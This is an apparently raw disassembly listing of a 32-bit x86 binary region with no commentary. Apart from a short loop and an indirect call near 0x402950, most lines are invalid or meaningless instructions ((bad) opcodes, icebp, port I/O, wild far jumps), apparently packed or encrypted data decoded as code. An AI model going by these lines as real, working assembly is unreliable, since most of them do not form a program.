  4028d2:	jmp    DWORD PTR [ebx]
  4028d4:	lods   eax,DWORD PTR ds:[esi]
  4028d5:	mov    eax,ds:0x32684564
  4028da:	enter  0x2f07,0x2d
  4028de:	adc    BYTE PTR [esi-0x60],al
  4028e1:	in     eax,0x5f
  4028e3:	xchg   esp,edx
  4028e5:	sahf   
  4028e6:	cmp    ebp,edi
  4028e8:	or     DWORD PTR [ebp-0x69],eax
  4028eb:	adc    bl,BYTE PTR ds:0xacd8470d
  4028f1:	inc    edx
  4028f2:	adc    DWORD PTR [eax+0x59],ebp
  4028f5:	fadd   QWORD PTR [eax+0x51e35db]
  4028fb:	mov    ds:0x4730d048,al
  402900:	icebp  
  402901:	(bad)  
  402902:	js     0x402913
  402904:	ds push ds
  402906:	inc    eax
  402907:	in     eax,0xbf
  402909:	sub    bl,BYTE PTR [ebp-0x45]
  40290c:	or     eax,0x6872b43c
  402911:	xchg   esi,eax
  402912:	and    edx,ecx
  402914:	retf   
  402915:	and    esi,edi
  402917:	bound  ebp,QWORD PTR [ecx+0x206d532d]
  40291d:	mov    ebx,0x6e4600a3
  402922:	icebp  
  402923:	add    al,0xf0
  402925:	jp     0x40290c
  402927:	fwait
  402928:	or     eax,0x1b62eea3
  40292d:	retf   0x1102
  402930:	mov    ch,0x91
  402932:	into   
  402933:	repz repz popf 
  402936:	push   0xffffffd7
  402938:	push   es
  402939:	retf   
  40293a:	mov    ds:0x4b28a0f0,al
  40293f:	cmp    al,0x22
  402941:	sub    DWORD PTR [ebx-0x7744c91a],ecx
  402947:	cmp    edi,edx
  402949:	mov    DWORD PTR ds:0x434392,0x545f
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432dde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43439e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43439e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43439e,edi
  402989:	cmp    DWORD PTR ds:0x43439e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43439e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43437e
  4029ab:	push   0x4692
  4029b0:	push   0x432738
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432cea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432de6,0x432dbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43436a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi-0x39e5ee04],ah
  402a13:	scas   eax,DWORD PTR es:[edi]
  402a14:	inc    DWORD PTR [eax]
  402a16:	or     al,0x70
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x4029bb
  402a1e:	and    eax,0x3d0bf8b1
  402a23:	mov    cl,0x17
  402a25:	nop
  402a26:	sub    al,0xc9
  402a28:	cwde   
  402a29:	or     DWORD PTR [esi+0x5309f0af],ebp
  402a2f:	in     eax,0x42
  402a31:	and    DWORD PTR [eax+0x29f1a50c],eax
  402a37:	sub    DWORD PTR [ecx-0x53],0x75fcbc38
  402a3e:	rol    eax,cl
  402a40:	jmp    0xce027ee8
  402a45:	push   0xffffffd1
  402a47:	ds in  al,0xf4
  402a4a:	mov    esi,0xa3f6b7a7
  402a4f:	in     eax,0xc3
  402a51:	jns    0x402a88
  402a53:	cmc    
  402a54:	and    eax,0x8fbd6485
  402a59:	cmp    bl,BYTE PTR [esp+ebp*8]
  402a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a5d:	mov    eax,0x7e7dab2d
  402a62:	cli    
  402a63:	inc    edx
  402a64:	jmp    0xb8af:0xa21d60ce
  402a6b:	xchg   edi,eax
  402a6c:	fidivr DWORD PTR [edx+0x24]
  402a6f:	adc    DWORD PTR [edi],0x1a
  402a72:	mov    ebx,0x48d9290
  402a77:	call   0x4eba:0x40cab529
  402a7e:	pop    esi
  402a7f:	pop    ebp
  402a80:	dec    eax
  402a81:	out    dx,eax
  402a82:	adc    BYTE PTR [edi-0x41],al
  402a85:	or     al,0x4c
  402a87:	pusha  
  402a88:	in     al,0x1f
  402a8a:	sub    eax,0x3e864c8d
  402a8f:	idiv   DWORD PTR [edi]
  402a91:	ja     0x402ad3
  402a93:	xor    eax,edx
  402a95:	(bad)  
  402a96:	leave  
  402a97:	outs   dx,DWORD PTR ds:[esi]
  402a98:	and    ch,BYTE PTR [ecx]
  402a9a:	mov    bl,0x6a
  402a9c:	(bad)  
  402a9d:	mov    al,ds:0xa87100fe
  402aa2:	fwait
  402aa3:	xchg   ecx,eax
  402aa4:	sbb    BYTE PTR [ecx+ebp*1],0x74
  402aa8:	(bad)
  402aac:	xchg   ecx,eax
  402aad:	cmp    dh,BYTE PTR [ebp-0x53]
  402ab0:	pop    ss
  402ab1:	add    DWORD PTR [ebx+edx*8-0x3b],ebx
  402ab5:	ins    BYTE PTR es:[edi],dx
  402ab6:	pushf  
  402ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab8:	sbb    DWORD PTR [ecx],eax
  402aba:	add    DWORD PTR [esi-0x35],0x3a
  402abe:	out    dx,al
  402abf:	pop    es
  402ac0:	dec    esp
  402ac1:	cld    
  402ac2:	pop    esi
  402ac3:	(bad)  
  402ac5:	cli    
  402ac6:	or     esi,DWORD PTR [ebx]
  402ac8:	sbb    eax,0xfc1f377c
  402acd:	lahf   
  402ace:	sub    DWORD PTR [ecx],ecx
  402ad0:	adc    al,0xa6
  402ad2:	retf   0x9ae0
  402ad5:	mov    cl,0xc8
  402ad7:	pushf  
  402ad8:	dec    esp
  402ad9:	sub    ch,BYTE PTR [ebp*4-0x3a63a571]
  402ae0:	mov    eax,ds:0xd04d461b
  402ae5:	inc    ecx
  402ae6:	jnp    0x402a81
  402ae8:	jns    0x402aad
  402aea:	js     0x402a8e
  402aec:	mov    ch,0x2f
  402aee:	iret   
  402aef:	push   0xb634e9d7
  402af4:	xor    bl,bh
  402af6:	ja     0x402b6a
  402af8:	mov    ds:0x4262ef43,al
  402afd:	(bad)  
  402afe:	out    0xc1,al
  402b00:	and    al,0x91
  402b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b03:	xor    ecx,0xd11b12f2
  402b09:	inc    esp
  402b0a:	sub    esi,edi
  402b0c:	ret    
  402b0d:	pop    es
  402b0e:	in     al,0xde
  402b10:	imul   esi,ebp,0xffffffa5
  402b13:	lods   al,BYTE PTR ds:[esi]
  402b14:	inc    esi
  402b15:	clc    
  402b16:	dec    ebp
  402b17:	pop    esi
  402b18:	scas   eax,DWORD PTR es:[edi]
  402b19:	jg     0x402ac3
  402b1b:	out    0x6e,al
  402b1d:	inc    esp
  402b1e:	dec    eax
  402b1f:	jnp    0x402b8b
  402b21:	push   ds
  402b22:	mov    esp,DWORD PTR gs:[edx+ebp*1]
  402b26:	bound  eax,QWORD PTR [edi+0x6f7d2dba]
  402b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b2d:	ret    
  402b2e:	fs jno 0x402b56
  402b31:	pusha  
  402b32:	xor    edi,DWORD PTR [eax+0x119caf6b]
  402b38:	inc    ebx
  402b39:	test   DWORD PTR [ecx],edi
  402b3b:	icebp  
  402b3c:	call   FWORD PTR [esi-0x48]
  402b3f:	add    al,0xd7
  402b41:	sub    DWORD PTR [edi-0x219ad3be],esi
  402b47:	sbb    DWORD PTR ds:0x381644df,ebp
  402b4d:	fimul  WORD PTR [eax]
  402b4f:	cwde   
  402b50:	dec    esp
  402b51:	xchg   edi,eax
  402b52:	(bad)  
  402b53:	fstp   DWORD PTR ds:0x9eadd516
  402b59:	dec    ecx
  402b5a:	inc    eax
  402b5b:	cmp    BYTE PTR [esi],bh
  402b5d:	adc    al,BYTE PTR [edi-0x67]
  402b60:	xor    eax,0xd476131
  402b65:	js     0x402b3e
  402b67:	dec    esp
  402b68:	movups xmm6,XMMWORD PTR [ebx+0x6cec680b]
  402b6f:	dec    edi
  402b70:	dec    edx
  402b71:	and    al,0xdb
  402b73:	and    DWORD PTR [edi-0x48dd3202],ecx
  402b79:	bound  edx,QWORD PTR [eax+0x54]
  402b7c:	fild   DWORD PTR [ebx]
  402b7e:	in     al,0x8d
  402b80:	test   esi,ecx
  402b82:	loop   0x402bef
  402b84:	xlat   BYTE PTR ds:[ebx]
  402b85:	cwde   
  402b86:	fwait
  402b87:	and    DWORD PTR [esi+eiz*8+0x3d],ebp
  402b8b:	inc    edx
  402b8c:	ret    0x185a
  402b8f:	pop    ds
  402b90:	or     cl,BYTE PTR [eax+0x76]
  402b93:	(bad)  
  402b94:	and    ebp,DWORD PTR [ecx]
  402b96:	pushf  
  402b97:	mov    eax,ds:0xb2aa3097
  402b9c:	test   DWORD PTR [eax+ebp*4-0x585fba06],ebx
  402ba3:	je     0x402ba0
  402ba5:	jno    0x402bf5
  402ba7:	xlat   BYTE PTR ds:[ebx]
  402ba8:	push   eax
  402ba9:	into   
  402baa:	pop    ecx
  402bab:	popf   
  402bac:	pusha  
  402bad:	or     eax,0x9bfb7dc0
  402bb2:	push   cs
  402bb3:	push   ebp
  402bb4:	mov    bl,0x21
  402bb6:	ret    
  402bb7:	je     0x402c00
  402bb9:	(bad)  [ebx]
  402bbb:	mov    dl,0x9e
  402bbd:	dec    edx
  402bbe:	sbb    dh,BYTE PTR [ecx-0x32]
  402bc1:	push   edi
  402bc2:	mov    ebx,0x27b3a516
  402bc7:	push   ebx
  402bc8:	and    ebx,DWORD PTR [esi-0x70]
  402bcb:	lea    esp,[eax+0x66e31860]
  402bd1:	jbe    0x402b95
  402bd3:	call   0x13d14168
  402bd8:	xor    eax,0xe16aacfe
  402bdd:	lods   eax,DWORD PTR ds:[esi]
  402bde:	mov    bh,0x8c
  402be0:	loop   0x402c37
  402be2:	mov    bh,0xf0
  402be4:	mov    ds:0x55e43c51,eax
  402be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bea:	arpl   WORD PTR [esi-0x8],dx
  402bed:	aad    0x9d
  402bef:	sub    bh,BYTE PTR [eax-0x378fc538]
  402bf5:	(bad)  
  402bf6:	fisttp DWORD PTR [eax+0x4f5f97e4]
  402bfc:	and    ecx,esp
  402bfe:	pop    ss
  402bff:	(bad)  
  402c00:	hlt    
  402c01:	popf   
  402c02:	pop    ds
  402c03:	and    edx,DWORD PTR [esi+0x47e142fc]
  402c09:	mov    ebp,0xd4bf391c
  402c0e:	inc    eax
  402c0f:	xor    DWORD PTR [edx-0x6],esp
  402c12:	cli    
  402c13:	pushf  
  402c14:	dec    edx
  402c15:	and    al,0xcd
  402c17:	sbb    eax,0x70880948
  402c1c:	imul   edx,DWORD PTR [ebp-0x3e9d7861],0x9739e9eb
  402c26:	call   0xad29:0xfe8d6d02
  402c2d:	stos   DWORD PTR es:[edi],eax
  402c2e:	sub    eax,0xee89b352
  402c33:	loop   0x402c47
  402c35:	cmp    DWORD PTR [edx+edx*2+0x7d],esi
  402c39:	dec    esi
  402c3a:	jmp    0x275f8d39
  402c3f:	js     0x402c5a
  402c41:	and    eax,0xff6b4145
  402c46:	out    0xb6,eax
  402c48:	in     eax,dx
  402c49:	(bad)  
  402c4a:	les    edi,FWORD PTR [eax]
  402c4c:	adc    esi,edi
  402c4e:	mov    cl,BYTE PTR [ebp-0x7b]
  402c51:	dec    ecx
  402c52:	mov    eax,0x7d5dfee
  402c57:	hlt    
  402c58:	pop    ss
  402c59:	mov    al,0xde
  402c5b:	mov    bl,0x84
  402c5d:	mov    esp,0x88547d2d
  402c62:	sbb    DWORD PTR [edx-0x4654bf9a],0x53a8f13a
  402c6c:	lods   al,BYTE PTR ds:[esi]
  402c6d:	cmp    BYTE PTR [ebx+0x40a8edd0],ah
  402c73:	fnstcw WORD PTR [esi-0x1cd3a232]
  402c79:	nop
  402c7a:	add    BYTE PTR [ebx],ah
  402c7c:	jge    0x402c6c
  402c7e:	ficom  DWORD PTR [edi+0x15]
  402c81:	gs pop esi
  402c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c84:	rcr    DWORD PTR [edx+0x76],0x6e
  402c88:	sub    cl,BYTE PTR [edi-0x4c39e916]
  402c8e:	rcr    ch,0x7e
  402c91:	sbb    eax,ecx
  402c93:	test   al,0xcb
  402c95:	gs push ecx
  402c97:	scas   al,BYTE PTR es:[edi]
  402c98:	imul   edi,esi,0x3a0ec5b7
  402c9e:	test   BYTE PTR [edi],0xec
  402ca1:	xchg   ebx,eax
  402ca2:	mov    BYTE PTR [esi*2-0x24e56819],bh
  402ca9:	ins    DWORD PTR es:[edi],dx
  402caa:	cmp    eax,0x4ccc40fd
  402caf:	icebp  
  402cb0:	nop
  402cb1:	imul   esp,DWORD PTR [ecx],0xffffff9b
  402cb4:	xchg   edi,eax
  402cb5:	call   0xeb0e:0xb794bb16
  402cbc:	xchg   ebp,eax
  402cbd:	push   cs
  402cbe:	mov    ah,0xcc
  402cc0:	cmp    cl,al
  402cc2:	jecxz  0x402d37
  402cc4:	sub    ebp,DWORD PTR [esi+0x383107bd]
  402cca:	sub    BYTE PTR [eax-0x48],ah
  402ccd:	or     eax,0x2cb2fe3c
  402cd2:	(bad)  
  402cd3:	icebp  
  402cd4:	sbb    DWORD PTR [ebx+0x3016899a],0x83467bd5
  402cde:	mov    esi,0x6d9a3788
  402ce3:	test   eax,0xfa22d98d
  402ce8:	xchg   edx,eax
  402ce9:	xor    ecx,DWORD PTR [esi]
  402ceb:	sahf   
  402cec:	inc    esi
  402ced:	mov    eax,ds:0x119fd04d
  402cf2:	mov    dh,0x98
  402cf4:	pop    ss
  402cf5:	push   ebp
  402cf6:	mov    ah,0x5b
  402cf8:	fldenv [ebx]
  402cfa:	mov    ds,WORD PTR [ecx+0x2917a96d]
  402d00:	test   al,0x44
  402d02:	mov    BYTE PTR [edi+0x4f],cl
  402d05:	int    0xdd
  402d07:	call   0x6ab2:0xc96510d8
  402d0e:	das    
  402d0f:	stos   DWORD PTR es:[edi],eax
  402d10:	inc    ebx
  402d11:	pop    ebx
  402d12:	ja     0x402d6a
  402d14:	fst    DWORD PTR [eax+0x58]
  402d17:	jne    0x402d83
  402d19:	jecxz  0x402cd3
  402d1b:	gs mov bh,0x65
  402d1e:	add    DWORD PTR [edx+0x42],eax
  402d21:	jae    0x402d07
  402d23:	ins    BYTE PTR es:[edi],dx
  402d24:	pushf  
  402d25:	xchg   edx,eax
  402d26:	aaa    
  402d27:	in     al,dx
  402d28:	in     al,0x6c
  402d2a:	or     BYTE PTR [ebx-0x1de48f4b],bl
  402d30:	mov    esp,0xf0fcb832
  402d35:	sbb    dl,dl
  402d37:	fwait
  402d38:	rol    DWORD PTR [esi],1
  402d3a:	test   DWORD PTR [ebx],0x43f7ac9
  402d40:	out    0xa7,eax
  402d42:	or     BYTE PTR [edx-0x6e18d985],cl
  402d48:	pop    ss
  402d49:	pop    esp
  402d4a:	test   ch,cl
  402d4c:	push   ebx
  402d4d:	mov    ecx,0x4a32aa0b
  402d52:	jle    0x402dc5
  402d54:	add    BYTE PTR [edi+0x601dffc2],bh
  402d5a:	pop    es
  402d5b:	push   ebx
  402d5c:	or     BYTE PTR [esi],ch
  402d5e:	lock xor bh,BYTE PTR [ebx]
  402d61:	jne    0x402db1
  402d63:	push   ebx
  402d64:	je     0x402dcb
  402d66:	or     eax,esp
  402d68:	sub    al,0x10
  402d6a:	ja     0x402d49
  402d6c:	leave  
  402d6d:	xor    eax,0xbbfa8890
  402d72:	in     eax,dx
  402d73:	popa   
  402d74:	sbb    eax,0x9c856dbb
  402d79:	adc    eax,0xf54b06ce
  402d7e:	or     esi,DWORD PTR [ebx]
  402d80:	dec    ecx
  402d81:	mov    edx,0x3fbdd85
  402d86:	sub    al,0xcf
  402d88:	cli    
  402d89:	pushf  
  402d8a:	sub    DWORD PTR [eax-0x47],esp
  402d8d:	xor    eax,0xdc070026
  402d92:	(bad)  
  402d93:	out    0xe3,eax
  402d95:	es mov esp,0xac93c867
  402d9b:	movntps XMMWORD PTR [ebp*1-0x434217cd],xmm7
  402da3:	sub    eax,0x627f7f8c
  402da8:	je     0x402dd4
  402daa:	push   esp
  402dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dac:	sbb    edx,ecx
  402dae:	dec    esi
  402daf:	push   esp
  402db0:	int    0x64
  402db2:	mov    edi,0x8b643153
  402db7:	jge    0x402db5
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	ror    BYTE PTR [ebx],0xba
  402dcd:	jge    0x402d76
  402dcf:	or     DWORD PTR [eax+0x70],esi
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402d6f
  402dd7:	stos   BYTE PTR es:[edi],al
  402dd8:	xchg   DWORD PTR [esi+0x19],eax
  402ddb:	add    ch,BYTE PTR [ebx]
  402ddd:	add    esi,edi
  402ddf:	pop    ebx
  402de0:	jg     0x402e17
  402de2:	jmp    0x3e5bcae4
  402de7:	cmp    eax,0x283d251c
  402dec:	outs   dx,DWORD PTR ds:[esi]
  402ded:	jg     0x402d93
  402def:	loope  0x402db4
  402df1:	test   DWORD PTR [eax+0x1c],0xdfd056c3
  402df8:	or     BYTE PTR [ebp-0x34],bl
  402dfb:	xor    BYTE PTR [eax+ebp*2+0x7dd39445],0x7b
  402e03:	pop    es
  402e04:	mov    eax,ds:0x2d03bb47
  402e09:	stos   DWORD PTR es:[edi],eax
  402e0a:	pop    edx
  402e0b:	jne    0x402e1e
  402e0d:	mov    eax,0x67a4fcb2
  402e12:	adc    esi,DWORD PTR [esi+0x1b]
  402e15:	and    BYTE PTR es:[esi+0x5f83a3c6],bh
  402e1c:	adc    cl,bh
  402e1e:	mov    bh,0xf9
  402e20:	xor    DWORD PTR [edx+0x408146fc],edx
  402e26:	sti    
  402e27:	(bad)  
  402e28:	out    0xb2,eax
  402e2a:	add    DWORD PTR [eax],edi
  402e2c:	xchg   edi,eax
  402e2d:	xchg   DWORD PTR [eax+0x4d],eax
  402e30:	adc    bl,BYTE PTR [ebx-0x7e]
  402e33:	fidivr DWORD PTR [ebx+ebp*8]
  402e36:	or     al,0x3f
  402e38:	popa   
  402e39:	clc    
  402e3a:	aaa    
  402e3b:	jg     0x402e14
  402e3d:	(bad)  
  402e3e:	repnz push edx
  402e40:	pop    ss
  402e41:	cli    
  402e42:	repz xor BYTE PTR [ebx+0x4a],al
  402e46:	iret   
  402e47:	xor    eax,0x862ceda2
  402e4c:	in     al,dx
  402e4d:	xor    ch,ch
  402e4f:	popf   
  402e50:	mov    ebp,eax
  402e52:	out    0xf8,eax
  402e54:	sti    
  402e55:	fsubr  QWORD PTR [ebx+0x33162c9b]
  402e5b:	hlt    
  402e5c:	sti    
  402e5d:	mov    eax,ds:0x404e6f73
  402e62:	sbb    DWORD PTR [eax-0x46],esi
  402e65:	dec    ebp
  402e66:	fidivr WORD PTR [edx+0x56341276]
  402e6c:	push   edi
  402e6d:	mov    ebx,DWORD PTR [esi]
  402e6f:	cmp    esi,0x69113102
  402e75:	xor    BYTE PTR [ebp+0x503aa863],ah
  402e7b:	and    BYTE PTR [eax],ch
  402e7d:	and    DWORD PTR [ecx-0x7f],esp
  402e80:	int    0xa7
  402e82:	cmp    al,0x3a
  402e84:	rcl    esi,cl
  402e86:	lea    ebp,[ebx+0x44]
  402e89:	jb     0x402ebd
  402e8b:	sub    eax,0x3dea2b20
  402e90:	les    edi,FWORD PTR [esi+0x5f1cff48]
  402e96:	gs push esi
  402e98:	inc    esi
  402e99:	out    0x51,eax
  402e9b:	or     ebp,DWORD PTR [edi+0x2d655849]
  402ea1:	aas    
  402ea2:	sub    eax,0x35dc0ad5
  402ea7:	(bad)  
  402ea8:	mov    ebx,0xc62112da
  402ead:	xchg   edi,eax
  402eae:	pop    ds
  402eaf:	arpl   bx,sp
  402eb1:	mov    edi,0x7445a5
  402eb6:	test   DWORD PTR ds:0x28b57c80,esi
  402ebc:	sar    ah,0xc4
  402ebf:	push   ss
  402ec0:	sub    bh,ch
  402ec2:	xor    BYTE PTR ds:0x123658ce,ch
  402ec8:	retf   0xe995
  402ecb:	fiadd  DWORD PTR [edi-0x46]
  402ece:	pop    ebx
  402ecf:	sbb    BYTE PTR [edx+0xc],al
  402ed2:	repnz mov ebx,0x71e2e6f0
  402ed8:	xor    edi,edi
  402eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402edb:	test   DWORD PTR [ebx-0x4debbd6d],ecx
  402ee1:	les    ecx,FWORD PTR [ecx-0x7a]
  402ee4:	call   0x3f5438ca
  402ee9:	gs dec ebx
  402eeb:	sbb    ebp,DWORD PTR [esi-0x21]
  402eee:	pushf  
  402eef:	adc    DWORD PTR [ebx],ebx
  402ef1:	daa    
  402ef2:	xchg   ebx,eax
  402ef3:	sub    ebx,DWORD PTR [eax+0x2f]
  402ef6:	push   ss
  402ef7:	sub    DWORD PTR [edi+0x5b588f5f],0x4f
  402efe:	jbe    0x402ebe
  402f00:	sbb    eax,0xa1955598
  402f05:	shl    DWORD PTR cs:[ebp-0x25],1
  402f09:	ds pop ss
  402f0b:	cmp    edx,DWORD PTR [ecx+0x76]
  402f0e:	pop    esp
  402f0f:	mov    bl,0xc0
  402f11:	sub    al,0x75
  402f13:	frstor [ecx+edi*4]
  402f16:	ja     0x402ee7
  402f18:	das    
  402f19:	jge    0x402f2f
  402f1b:	js     0x402ec0
  402f1d:	repz dec ecx
  402f1f:	rol    DWORD PTR [edi+eax*2],cl
  402f22:	xor    DWORD PTR [edi-0x4b],edi
  402f25:	xchg   esp,eax
  402f26:	jb     0x402ed3
  402f28:	adc    bl,BYTE PTR [ebx+0x1b]
  402f2b:	mov    ds:0xbc059a3e,eax
  402f30:	ins    BYTE PTR es:[edi],dx
  402f31:	push   0x72
  402f33:	add    eax,0xb76395fb
  402f38:	pop    ds
  402f39:	xchg   esi,eax
  402f3a:	push   ebx
  402f3b:	cmp    al,0x76
  402f3d:	das    
  402f3e:	les    ebx,FWORD PTR [edx+0x6c]
  402f41:	add    BYTE PTR [ecx],bl
  402f43:	ret    
  402f44:	ret    
  402f45:	clc    
  402f46:	push   ebx
  402f47:	stos   BYTE PTR es:[edi],al
  402f48:	mov    esi,DWORD PTR [ecx-0x27]
  402f4b:	pusha  
  402f4c:	add    eax,0x93ce465f
  402f51:	lock jecxz 0x402f80
  402f54:	mov    BYTE PTR [esi+0x68],bh
  402f57:	sbb    DWORD PTR [ebx+0x156e3ee4],ebx
  402f5d:	dec    esp
  402f5e:	inc    esp
  402f5f:	enter  0xe9db,0xdd
  402f63:	pushf  
  402f64:	idiv   BYTE PTR [eax-0x2b]
  402f67:	mov    esi,0x7f19d9cc
  402f6c:	push   esi
  402f6d:	push   ebp
  402f6e:	je     0x402f60
  402f70:	xchg   edx,eax
  402f71:	adc    bh,cl
  402f73:	rcl    ch,cl
  402f75:	ja     0x402f4c
  402f77:	sub    BYTE PTR [esi],cl
  402f79:	sub    BYTE PTR [eax],ch
  402f7b:	adc    BYTE PTR [eax-0x7b],dl
  402f7e:	ret    0xbb15
  402f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f82:	pop    ecx
  402f83:	repz inc edx
  402f85:	dec    edx
  402f86:	lock fnstcw WORD PTR [ecx]
  402f89:	jae    0x402f59
  402f8b:	and    DWORD PTR [esi+0x60],edx
  402f8e:	dec    ecx
  402f8f:	push   ss
  402f90:	mov    dl,0xfb
  402f92:	mov    esi,0xe2ff476e
  402f97:	nop
  402f98:	adc    DWORD PTR [ecx-0x5e0e0e63],ebx
  402f9e:	pop    edx
  402f9f:	jmp    0x402f30
  402fa1:	stos   BYTE PTR es:[edi],al
  402fa2:	sti    
  402fa3:	pop    ebx
  402fa4:	fs in  al,0x78
  402fa7:	ret    0xaa16
  402faa:	dec    eax
  402fab:	and    eax,0xe5e2804d
  402fb0:	cli    
  402fb1:	sbb    edi,DWORD PTR [ebx-0x5]
  402fb4:	fcom   QWORD PTR [eax+0x2e430d17]
  402fba:	pop    eax
  402fbb:	mov    esp,0x7bafdee4
  402fc0:	or     al,0xd2
  402fc2:	or     eax,esi
  402fc4:	scas   eax,DWORD PTR es:[edi]
  402fc5:	(bad)  
  402fc6:	out    0x6b,eax
  402fc8:	mov    edi,0x437a8f23
  402fcd:	enter  0xdaa4,0x9
  402fd1:	aas    
  402fd2:	and    ch,BYTE PTR [edi-0x27]
  402fd5:	mov    eax,0x9b72aab8
  402fda:	mov    bh,0x92
  402fdc:	add    eax,DWORD PTR [edx+0x47]
  402fdf:	repnz scas eax,DWORD PTR es:[edi]
  402fe1:	out    dx,al
  402fe2:	fwait
  402fe3:	(bad)  
  402fe4:	and    al,0x73
  402fe6:	xor    BYTE PTR [edx+0x19124efb],ch
  402fec:	loop   0x403067
  402fee:	jp     0x40303a
  402ff0:	aas    
  402ff1:	lods   eax,DWORD PTR es:[esi]
  402ff3:	in     eax,0xe1
  402ff5:	inc    esp
  402ff6:	imul   eax,DWORD PTR [ebp-0x40],0x35
  402ffa:	mov    bl,0x55
  402ffc:	rol    DWORD PTR [ebp+ebx*1-0x4d16f454],0xde
  403004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403005:	call   FWORD PTR [eax-0x4db3bb82]
  40300b:	pop    esp
  40300c:	jl     0x402fcc
  40300e:	cmc    
  40300f:	cdq    
  403010:	push   esp
  403011:	(bad)  
  403012:	xchg   esi,eax
  403013:	les    ebx,FWORD PTR [eax]
  403015:	cmp    eax,ebx
  403017:	mov    ebp,0xc2d86b23
  40301c:	jno    0x403044
  40301e:	scas   al,BYTE PTR es:[edi]
  40301f:	adc    eax,0x52e644d5
  403024:	inc    edi
  403025:	dec    edx
  403026:	xor    DWORD PTR [ebx+0x78e8ab66],ebx
  40302c:	pop    edi
  40302d:	test   BYTE PTR [ecx-0x6c8880f9],dl
  403033:	lock pop eax
  403035:	lods   al,BYTE PTR ds:[esi]
  403036:	mov    WORD PTR [esi],cs
  403038:	add    esp,ecx
  40303a:	adc    esi,DWORD PTR [esi+edx*4-0x43]
  40303e:	loop   0x403082
  403040:	push   ds
  403041:	imul   ecx,DWORD PTR [ebx+0x59],0x697284e2
  403048:	xchg   ebx,eax
  403049:	cmp    eax,0x4b48386e
  40304e:	aad    0x7d
  403050:	push   es
  403051:	pop    ecx
  403052:	push   esi
  403053:	xchg   DWORD PTR [eax],esi
  403055:	mov    dl,0x92
  403057:	cmp    al,0x2e
  403059:	or     al,BYTE PTR [edi+edi*8+0x57]
  40305d:	dec    ebx
  40305e:	out    0x29,al
  403060:	loope  0x403011
  403062:	inc    edx
  403063:	mov    ebp,0x299688d3
  403068:	push   0x88d9db40
  40306d:	in     al,dx
  40306e:	dec    ebp
  40306f:	push   edi
  403070:	cmp    bh,BYTE PTR [eax]
  403072:	fdiv   DWORD PTR [edi+0x10516002]
  403078:	jo     0x403046
  40307a:	pop    ecx
  40307b:	cdq    
  40307c:	lea    edi,[edx+ebx*2-0x7e97df99]
  403083:	test   ecx,eax
  403085:	shl    BYTE PTR [edi],1
  403087:	adc    eax,0x6de380cc
  40308c:	push   es
  40308d:	push   ds
  40308e:	inc    esp
  40308f:	jp     0x4030f8
  403091:	ins    DWORD PTR es:[edi],dx
  403092:	push   ebx
  403093:	adc    bl,BYTE PTR [esi]
  403095:	push   eax
  403096:	jbe    0x403098
  403098:	fwait
  403099:	mov    eax,0xa0853769
  40309e:	push   cs
  40309f:	shr    BYTE PTR [esi+0x61],cl
  4030a2:	sbb    dh,BYTE PTR ss:[ebx-0x784a774c]
  4030a9:	mov    al,ds:0x85aa0553
  4030ae:	sbb    BYTE PTR [edi+0x22],al
  4030b1:	loopne 0x4030f7
  4030b3:	(bad)  
  4030b4:	cs (bad) 
  4030b6:	fsubr  QWORD PTR [ecx-0x59]
  4030b9:	je     0x40307b
  4030bb:	push   ebp
  4030bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030bd:	sub    eax,0x8a547ce8
  4030c2:	jl     0x4030e6
  4030c4:	jge    0x403048
  4030c6:	outs   dx,BYTE PTR ds:[esi]
  4030c7:	in     eax,dx
  4030c8:	in     al,dx
  4030c9:	daa    
  4030ca:	fistp  WORD PTR es:[esi+0x71001fc9]
  4030d1:	or     DWORD PTR [edx+0x4e663aa4],ebx
  4030d7:	xor    BYTE PTR [ebx+eiz*4-0x62],ah
  4030db:	sbb    eax,0xf5ce6f77
  4030e0:	add    BYTE PTR [edx+0x647ac639],ah
  4030e6:	mov    dh,0xb6
  4030e8:	xchg   DWORD PTR [edi-0x244ca572],eax
  4030ee:	stos   DWORD PTR es:[edi],eax
  4030ef:	jno    0x40308c
  4030f1:	fdivp  st(2),st
